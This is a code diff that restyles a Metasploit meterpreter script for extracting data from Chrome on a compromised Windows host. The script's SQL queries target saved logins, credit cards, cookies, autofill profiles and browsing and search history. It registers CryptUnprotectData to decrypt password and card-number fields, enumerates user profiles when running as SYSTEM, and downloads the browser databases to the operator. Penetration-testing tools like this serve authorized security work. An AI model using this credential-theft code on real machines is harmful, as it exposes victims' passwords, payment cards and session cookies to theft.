@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 #
 # Script to extract data from a chrome installation.
@@ -20,17 +20,17 @@ if client.platform !~ /win32/
 end
 @host_info = client.sys.config.sysinfo
 @chrome_files = [
-  { :in_file => "Web Data", :sql => "select * from autofill;", :out_file => "autofill"},
-  { :in_file => "Web Data", :sql => "SELECT username_value,origin_url,signon_realm FROM logins;", :out_file => "user_site"},
-  { :in_file => "Web Data", :sql => "select * from autofill_profiles;", :out_file => "autofill_profiles"},
-  { :in_file => "Web Data", :sql => "select * from credit_cards;", :out_file => "autofill_credit_cards", :encrypted_fields => ["card_number_encrypted"]},
-  { :in_file => "Cookies", :sql => "select * from cookies;", :out_file => "cookies"},
-  { :in_file => "History", :sql => "select * from urls;", :out_file => "url_history"},
-  { :in_file => "History", :sql => "SELECT url FROM downloads;", :out_file => "download_history"},
-  { :in_file => "History", :sql => "SELECT term FROM keyword_search_terms;", :out_file => "search_history"},
-  { :in_file => "Login Data", :sql => "select * from logins;", :out_file => "logins", :encrypted_fields => ["password_value"]},
-  { :in_file => "Bookmarks", :sql => nil, :out_file => "bookmarks.json"},
-  { :in_file => "Preferences", :sql => nil, :out_file => "preferences.json"},
+  { in_file: "Web Data", sql: "select * from autofill;", out_file: "autofill" },
+  { in_file: "Web Data", sql: "SELECT username_value,origin_url,signon_realm FROM logins;", out_file: "user_site" },
+  { in_file: "Web Data", sql: "select * from autofill_profiles;", out_file: "autofill_profiles" },
+  { in_file: "Web Data", sql: "select * from credit_cards;", out_file: "autofill_credit_cards", encrypted_fields: ["card_number_encrypted"] },
+  { in_file: "Cookies", sql: "select * from cookies;", out_file: "cookies" },
+  { in_file: "History", sql: "select * from urls;", out_file: "url_history" },
+  { in_file: "History", sql: "SELECT url FROM downloads;", out_file: "download_history" },
+  { in_file: "History", sql: "SELECT term FROM keyword_search_terms;", out_file: "search_history" },
+  { in_file: "Login Data", sql: "select * from logins;", out_file: "logins", encrypted_fields: ["password_value"] },
+  { in_file: "Bookmarks", sql: nil, out_file: "bookmarks.json" },
+  { in_file: "Preferences", sql: nil, out_file: "preferences.json" }
 ]
 @migrate = false
 @old_pid = nil
@@ -42,7 +42,7 @@ opts = Rex::Parser::Arguments.new(
   "-f" => [ true, "Output format: j[son], y[aml], t[ext]. Defaults to json"]
 )
 
-opts.parse(args) { |opt, idx, val|
+opts.parse(args) do |opt, _idx, val|
   case opt
   when "-m"
     @migrate = true
@@ -68,7 +68,7 @@ opts.parse(args) { |opt, idx, val|
     print_line(opts.usage)
     raise Rex::Script::Completed
   end
-}
+end
 
 @output_format << "json" if @output_format.empty?
 if @output_format.include?("json")
@@ -87,20 +87,18 @@ print_status("using output format(s): " + @output_format.join(", "))
 
 def prepare_railgun
   rg = client.railgun
-  if (!rg.get_dll('crypt32'))
-    rg.add_dll('crypt32')
-  end
+  rg.add_dll('crypt32') unless rg.get_dll('crypt32')
 
-  if (!rg.crypt32.functions["CryptUnprotectData"])
+  unless rg.crypt32.functions["CryptUnprotectData"]
     rg.add_function("crypt32", "CryptUnprotectData", "BOOL", [
-        ["PBLOB","pDataIn", "in"],
-        ["PWCHAR", "szDataDescr", "out"],
-        ["PBLOB", "pOptionalEntropy", "in"],
-        ["PDWORD", "pvReserved", "in"],
-        ["PBLOB", "pPromptStruct", "in"],
-        ["DWORD", "dwFlags", "in"],
-        ["PBLOB", "pDataOut", "out"]
-      ])
+                      ["PBLOB", "pDataIn", "in"],
+                      ["PWCHAR", "szDataDescr", "out"],
+                      ["PBLOB", "pOptionalEntropy", "in"],
+                      ["PDWORD", "pvReserved", "in"],
+                      ["PBLOB", "pPromptStruct", "in"],
+                      ["DWORD", "dwFlags", "in"],
+                      ["PBLOB", "pDataOut", "out"]
+                    ])
   end
 end
 
@@ -157,7 +155,7 @@ def process_files(username)
         end
         res
       end
-      if rows.length > 0
+      if !rows.empty?
         print_status("writing output '#{item[:out_file]}'...")
         write_output(out_file, rows)
       else
@@ -178,13 +176,13 @@ def extract_data(username)
     return false
   end
 
-  @chrome_files.map{ |e| e[:in_file] }.uniq.each do |f|
+  @chrome_files.map { |e| e[:in_file] }.uniq.each do |f|
     remote_path = chrome_path + '\\' + f
     local_path = File.join(@log_dir, Rex::FileUtils.clean_path(username), f)
     print_status("downloading file #{f} to '#{local_path}'...")
     client.fs.file.download_file(local_path, remote_path)
   end
-  return true
+  true
 end
 
 if @migrate
@@ -222,7 +220,7 @@ if is_system?
   client.fs.dir.foreach(@profiles_path) do |u|
     usernames << u if u !~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
   end
-  print_status "users found: #{usernames.join(", ")}"
+  print_status "users found: #{usernames.join(', ')}"
 else
   print_status "running as user '#{uid}'..."
   usernames << client.sys.config.getenv('USERNAME')
